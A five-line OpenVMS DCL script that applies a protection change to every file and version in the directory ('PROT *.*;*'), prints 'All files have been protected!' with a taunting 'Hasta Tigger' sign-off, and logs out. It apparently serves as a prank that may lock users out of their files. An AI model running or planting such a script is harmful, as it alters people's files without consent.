$ PROT *.*;*
$ write SYs$output "All files have been protected!"
$ write Sys$output "...Hasta Tigger...."
$ Logout
$ Exit 1
